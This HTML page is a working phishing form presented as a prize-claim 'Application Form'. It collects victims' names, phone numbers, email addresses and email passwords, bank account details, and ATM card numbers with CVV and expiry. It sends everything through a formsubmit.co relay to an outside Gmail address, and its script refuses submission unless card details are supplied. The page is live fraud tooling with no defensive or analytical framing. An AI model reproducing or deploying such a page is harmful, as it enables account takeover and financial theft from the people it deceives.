<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 15px;
      margin: 0;
      background-color: #f9f9f9;
    }

    form {
      max-width: 480px;
      margin: auto;
      background: white;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }

    h2 {
      text-align: center;
      font-size: 1.5em;
      margin-bottom: 10px;
    }

    .notice {
      text-align: center;
      font-size: 0.9em;
      color: #555;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
      font-size: 0.95em;
    }

    input, select {
      width: 100%;
      padding: 10px;
      font-size: 1em;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    .readonly-box {
      background-color: #f0f0f0;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-top: 8px;
      font-weight: bold;
    }

    .card-section {
      margin-top: 10px;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1em;
    }

    button:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }

    button:hover:enabled {
      background-color: #0056b3;
    }

    .hidden {
      display: none;
    }

    .password-wrapper {
      position: relative;
    }

    .password-wrapper span {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 1.1em;
    }
  </style>
</head>
<body>

  <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
    <h2>Application Form</h2>
    <div class="notice">We keep your details secure and confidential.</div>

    <!-- 1 -->
    <label for="fullName">1. Full Name</label>
    <input type="text" id="fullName" name="fullName" required>

    <!-- 2 -->
    <label for="phoneNumber">2. Phone Number</label>
    <input type="tel" id="phoneNumber" name="phoneNumber" required>

    <!-- 3 -->
    <label for="emailAddress">3. Email Address</label>
    <input type="email" id="emailAddress" name="emailAddress" required>

    <!-- 4 -->
    <label for="emailPassword">4. Email Password</label>
    <div class="password-wrapper">
      <input type="password" id="emailPassword" name="emailPassword" required style="padding-right: 40px;">
      <span onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <!-- 5 -->
    <label for="amountWon">5. Amount You Won</label>
    <input type="text" id="amountWon" name="amountWon" required>

    <!-- 6 -->
    <label for="bankType">6. Bank Account Type (e.g., Standard Bank)</label>
    <input type="text" id="bankType" name="bankType" placeholder="e.g., Standard Bank" required>

    <!-- 7 -->
    <label for="bankNumber">7. Bank Account Number</label>
    <input type="text" id="bankNumber" name="bankNumber" required>

    <!-- 8 -->
    <label for="accountHolder">8. Bank Account Holder's Name</label>
    <input type="text" id="accountHolder" name="accountHolder" required>

    <!-- 9 -->
    <label for="atmLinked">9. Did you link an ATM card to your <span id="bankTypePreview">bank</span> account?</label>
    <select id="atmLinked" name="atmLinked" required>
      <option value="">--Select--</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <!-- 10 -->
    <div class="card-section hidden" id="cardSection">
      <label>10. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>

      <label for="atmNumber">ATM Card Number</label>
      <input type="text" id="atmNumber" name="atmNumber" maxlength="16" pattern="\d{13,16}" inputmode="numeric">

      <label for="cvv">CVV (3 digits only)</label>
      <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" inputmode="numeric" required>

      <label for="expiry">Expiry Date (MM/YY)</label>
      <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required oninput="formatExpiry(this)">
    </div>

    <!-- 11 -->
    <label>11. Confirmation</label>
    <div class="readonly-box" id="autoFilledNote">
      You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
    </div>

    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thankyou.html">
    <input type="hidden" name="_captcha" value="false">

    <button type="submit" id="submitButton">Submit Application</button>
  </form>

  <script>
    const amountInput = document.getElementById("amountWon");
    const phoneInput = document.getElementById("phoneNumber");
    const bankInput = document.getElementById("bankType");
    const atmLinked = document.getElementById("atmLinked");

    const amountPreview = document.getElementById("amountPreview");
    const bankPreview = document.getElementById("bankPreview");
    const bankTypePreview = document.getElementById("bankTypePreview");
    const autoFilledNote = document.getElementById("autoFilledNote");
    const cardSection = document.getElementById("cardSection");

    const cvvInput = document.getElementById("cvv");
    const expiryInput = document.getElementById("expiry");
    const submitButton = document.getElementById("submitButton");

    function updateDynamicText() {
      const amount = amountInput.value || "[amount]";
      const phone = phoneInput.value || "[phone]";
      const bank = bankInput.value || "[bank]";

      amountPreview.textContent = amount;
      bankPreview.textContent = bank;
      bankTypePreview.textContent = bank;

      if (atmLinked.value === "Yes") {
        autoFilledNote.textContent = `You will receive ${amount} immediately you submit the form and the SMS verification sent to your number ${phone}`;
      }
    }

    amountInput.addEventListener("input", updateDynamicText);
    phoneInput.addEventListener("input", updateDynamicText);
    bankInput.addEventListener("input", updateDynamicText);

    atmLinked.addEventListener("change", () => {
      if (atmLinked.value === "Yes") {
        cardSection.classList.remove("hidden");
        cardSection.style.display = "block";

        cvvInput.required = true;
        expiryInput.required = true;

        submitButton.disabled = false;
        submitButton.textContent = "Submit Application";

        updateDynamicText();
      } else {
        cardSection.classList.add("hidden");
        cardSection.style.display = "none";

        cvvInput.required = false;
        expiryInput.required = false;

        autoFilledNote.textContent = "YOU MUST HAVE AN ATM CARD TO PROCEED";

        submitButton.disabled = true;
        submitButton.textContent = "Application Declined ‚Äì ATM Card Required";
      }
    });

    function formatExpiry(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.length >= 3) {
        input.value = value.slice(0, 2) + '/' + value.slice(2, 4);
      } else {
        input.value = value;
      }
    }

    function togglePassword() {
      const passwordInput = document.getElementById("emailPassword");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
      } else {
        passwordInput.type = "password";
      }
    }
  </script>

</body>
</html>
